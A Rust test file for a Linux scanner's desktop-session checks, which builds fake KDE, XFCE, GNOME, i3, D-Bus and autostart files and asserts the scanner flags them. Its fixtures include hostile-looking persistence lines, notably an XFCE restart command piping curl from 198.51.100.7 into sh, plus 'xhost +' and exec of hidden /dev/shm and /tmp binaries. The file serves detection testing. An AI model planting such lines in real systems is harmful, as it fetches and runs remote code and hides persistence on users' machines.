//! Desktop-environment checks (KDE, GNOME, XFCE, window managers, session type), with made-up
//! files in a temporary directory. `fixtures/dconf-user` is a real settings database made with
//! `dconf compile` from made-up values.

use scanner::config::Config;
use scanner::modules::desktop_session::environments::{hiding_window_rules, opens_x11, window_manager_commands, xfconf_commands};
use scanner::modules::desktop_session::gvdb::{read_database, read_keyfile, Setting};
use scanner::report::Report;
use scanner::{run_scan, ModuleId, ScanOptions, Severity, SysRoot};
use std::fs;
use std::os::unix::fs::{symlink, PermissionsExt};
use std::path::Path;

const DCONF: &[u8] = include_bytes!("fixtures/dconf-user");

fn write(root: &Path, abs: &str, content: &str) {
    let p = root.join(abs.trim_start_matches('/'));
    fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
    fs::write(p, content).expect("write");
}

fn program(root: &Path, abs: &str) {
    write(root, abs, "x");
    fs::set_permissions(root.join(abs.trim_start_matches('/')), fs::Permissions::from_mode(0o755)).expect("chmod");
}

fn scan(root: &Path, modules: &[ModuleId]) -> Report {
    let opts = ScanOptions { modules: modules.to_vec(), ..ScanOptions::default() };
    run_scan(&SysRoot::new(root), &Config::default(), &opts, &|_| {})
}

fn of<'a>(report: &'a Report, rule: &str) -> Vec<(Severity, &'a str)> {
    report.findings.iter().filter(|f| f.rule == rule).map(|f| (f.severity, f.title.as_str())).collect()
}

#[test]
fn reads_a_real_dconf_database_and_survives_damage() {
    let settings = read_database(DCONF).expect("database");
    assert_eq!(settings.get("/system/proxy/mode"), Some(&Setting::Text("manual".into())));
    assert_eq!(settings.get("/org/gnome/desktop/remote-desktop/rdp/enable"), Some(&Setting::Flag(true)));
    assert_eq!(settings.get("/org/gnome/shell/enabled-extensions"), Some(&Setting::List(vec!["mine@example.org".into(), "other@example.org".into()])));
    assert_eq!(settings.get("/system/proxy/http/port"), Some(&Setting::Other));
    assert!(read_database(b"not a database").is_none());
    // cut off or scrambled files must never crash
    for end in 0..DCONF.len() {
        let _ = read_database(&DCONF[..end]);
    }
    for at in 16..DCONF.len() {
        let mut broken = DCONF.to_vec();
        broken[at] ^= 0xff;
        let _ = read_database(&broken);
    }
    let keys = read_keyfile("[org/gnome/desktop/screensaver]\nlock-enabled=false\n[system/proxy]\nmode='auto'\n");
    assert_eq!(keys.get("/system/proxy/mode"), Some(&Setting::Text("auto".into())));
    assert_eq!(keys.get("/org/gnome/desktop/screensaver/lock-enabled"), Some(&Setting::Flag(false)));
}

#[test]
fn parses_window_manager_xfce_and_kwin_files() {
    let sway = "# exec /tmp/no\nexec_always --no-startup-id waybar\nbindsym $mod+Return exec foot\nexec nm-applet\n";
    assert_eq!(window_manager_commands("/home/a/.config/sway/config", sway), vec!["waybar", "foot", "nm-applet"]);
    let hypr = "exec-once = /tmp/x\nbind = SUPER, Q, exec, kitty\nlock_cmd = hyprlock\n";
    assert_eq!(window_manager_commands("/home/a/.config/hypr/hyprland.conf", hypr), vec!["/tmp/x", "kitty", "hyprlock"]);
    assert_eq!(window_manager_commands("/home/a/.config/swayidle/config", "timeout 300 'swaylock -f'\nbefore-sleep 'lock.sh'\n"), vec!["swaylock -f", "lock.sh"]);
    assert_eq!(window_manager_commands("/home/a/.config/openbox/autostart", "@tint2 &\n# x\n"), vec!["tint2"]);
    let xml = "<channel>\n <property name=\"Client0_Command\" type=\"array\">\n  <value type=\"string\" value=\"sh\"/>\n  <value type=\"string\" value=\"-c\"/>\n </property>\n <property name=\"&lt;Super&gt;e\" type=\"string\" value=\"thunar &amp;\"/>\n</channel>\n";
    assert_eq!(xfconf_commands(xml), vec!["sh -c", "thunar &"]);
    assert_eq!(hiding_window_rules("[1]\nDescription=ghost\nopacityactive=0\n[2]\nskiptaskbar=true\n").len(), 1);
    assert!(opens_x11("xhost +") && opens_x11("/usr/bin/xhost +local:"));
    assert!(!opens_x11("xhost +si:localuser:root") && !opens_x11("xhost -"));
}

#[test]
fn desktop_settings_that_run_commands_or_reroute() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    let home = "/home/anna";
    let file = |name: &str, text: &str| write(root, &format!("{home}/{name}"), text);
    fs::create_dir_all(root.join("home/anna/.config/dconf")).expect("mkdir");
    fs::write(root.join("home/anna/.config/dconf/user"), DCONF).expect("dconf");
    file(".local/share/gnome-shell/extensions/mine@example.org/extension.js", "x");
    // KDE
    file(".config/ksmserverrc", "[Session: saved at previous logout]\nrestoreCommand1=/usr/bin/kate,-session,x\nrestoreCommand2=/tmp/.x/agent\n");
    file(".config/plasma_workspace.notifyrc", "[Event/locked]\nAction=Execute\nExecute=/home/anna/Downloads/onlock.sh\n");
    file(".config/kwinrc", "[Plugins]\nhelperEnabled=true\nofficialEnabled=false\n");
    file(".local/share/kwin/scripts/helper/contents/code/main.js", "callDBus('org.freedesktop.systemd1', 'StartUnit');\n");
    file(".local/share/kwin/scripts/official/contents/code/main.js", "x\n");
    file(".config/kioslaverc", "[Proxy Settings]\nProxyType=1\nhttpProxy=http://bob:pw@198.51.100.7 8080\n");
    // XFCE and window managers
    file(".cache/sessions/xfce4-session-pc:0", "[Session: Default]\nClient0_RestartCommand=bash,-c,curl http://198.51.100.7/a | sh\n");
    file(".config/i3/config", "exec --no-startup-id nm-applet\nexec /dev/shm/.k\n");
    file(".xprofile", "xhost +\n");
    // D-Bus and portals
    write(root, "/usr/share/dbus-1/services/portal.service", "[D-BUS Service]\nName=org.freedesktop.portal.Desktop\nExec=/usr/libexec/xdg-desktop-portal\n");
    file(".local/share/dbus-1/services/p.service", "[D-BUS Service]\nName=org.freedesktop.portal.Desktop\nExec=/home/anna/.cache/portal\n");
    file(".local/share/xdg-desktop-portal/portals/x.portal", "[portal]\nDBusName=x\n");
    write(root, "/usr/share/xsessions/test.desktop", "");
    let report = scan(root, &[ModuleId::DesktopSession]);

    let commands = of(&report, "PERS-DESKTOP-COMMAND");
    let has = |end: &str| commands.iter().any(|(_, t)| t.ends_with(end));
    assert_eq!(commands.len(), 5, "{commands:?}");
    for end in [".config/ksmserverrc", "plasma_workspace.notifyrc", "xfce4-session-pc:0", ".config/i3/config", ".config/dconf/user"] {
        assert!(has(end), "{end}: {commands:?}");
    }
    assert_eq!(of(&report, "PERS-KWIN-SCRIPT").iter().map(|f| f.0).collect::<Vec<_>>(), vec![Severity::Medium]);
    let proxies: Vec<_> = report.findings.iter().filter(|f| f.rule == "PERS-DESKTOP-PROXY").collect();
    assert_eq!(proxies.len(), 2);
    assert!(proxies.iter().all(|f| !f.evidence.contains(":pw@")), "passwords are hidden");
    assert_eq!(of(&report, "PERS-REMOTE-DESKTOP").len(), 1);
    assert_eq!(of(&report, "PERS-SCREEN-LOCK").len(), 1);
    assert_eq!(of(&report, "PERS-GNOME-EXTENSION").len(), 1);
    assert_eq!(of(&report, "PERS-X11-OPEN").len(), 1);
    assert_eq!(of(&report, "PERS-DBUS-SERVICE").iter().map(|f| f.0).collect::<Vec<_>>(), vec![Severity::High]);
    assert_eq!(of(&report, "PERS-PORTAL").len(), 1);
    assert!(!report.inventory.persistence_files.keys().any(|k| k.ends_with("ksmserverrc")), "session state changes at every logout");
}

#[test]
fn autostart_replacements_and_unknown_programs() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    for p in ["/usr/bin/update-notifier", "/usr/bin/other", "/usr/local/bin/helper", "/usr/lib/app/real"] {
        program(root, p);
    }
    // a link, as the alternatives system makes them
    symlink("../lib/app/real", root.join("usr/bin/app")).expect("link");
    write(root, "/var/lib/dpkg/info/x.list", "/usr/bin/update-notifier\n/usr/bin/other\n/usr/lib/app/real\n/etc/xdg/autostart/notify.desktop\n");
    write(root, "/etc/xdg/autostart/notify.desktop", "[Desktop Entry]\nExec=update-notifier\n");
    write(root, "/home/anna/.config/autostart/notify.desktop", "[Desktop Entry]\nExec=other --quiet\n");
    write(root, "/home/anna/.config/autostart/helper.desktop", "[Desktop Entry]\nExec=helper\n");
    write(root, "/home/anna/.config/autostart/app.desktop", "[Desktop Entry]\nExec=app\n");
    write(root, "/usr/share/xsessions/test.desktop", "");
    let report = scan(root, &[ModuleId::DesktopSession]);
    let auto = of(&report, "PERS-AUTOSTART");
    assert_eq!(auto.len(), 3, "{auto:?}");
    assert!(auto.iter().any(|(s, t)| *s == Severity::Medium && t.contains("replaces a system entry")));
    assert!(auto.iter().any(|(s, t)| *s == Severity::Medium && t.ends_with("helper.desktop") && t.contains("no package")));
    assert!(auto.iter().any(|(s, t)| *s == Severity::Info && t.ends_with("app.desktop")));
}

#[test]
fn keyboard_readers_and_session_type() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    for (pid, exe, comm, uid, cmd) in [
        (10, "/usr/bin/kwin_wayland", "kwin_wayland", 1000, "kwin_wayland"),
        (11, "/home/anna/.cache/k", "k", 1000, "k"),
        (12, "/usr/bin/xinput", "xinput", 1000, "xinput\0test\0 9"),
    ] {
        write(root, &format!("/proc/{pid}/status"), &format!("Name:\t{comm}\nUid:\t{uid} {uid} {uid} {uid}\n"));
        write(root, &format!("/proc/{pid}/cmdline"), cmd);
        write(root, &format!("/proc/{pid}/environ"), "XDG_SESSION_TYPE=x11\0XDG_CURRENT_DESKTOP=XFCE\0");
        symlink(exe, root.join(format!("proc/{pid}/exe"))).expect("link");
        fs::create_dir_all(root.join(format!("proc/{pid}/fd"))).expect("mkdir");
        if pid != 12 {
            symlink("/dev/input/event3", root.join(format!("proc/{pid}/fd/5"))).expect("fd");
        }
    }
    let report = scan(root, &[ModuleId::DesktopSession]);
    let readers = of(&report, "PROC-INPUT-READER");
    assert_eq!(readers.len(), 2, "{readers:?}");
    assert!(readers.iter().all(|(s, _)| *s == Severity::High));
    assert!(report.notes.iter().any(|n| n.contains("X11") && n.contains("XFCE")), "{:?}", report.notes);
}
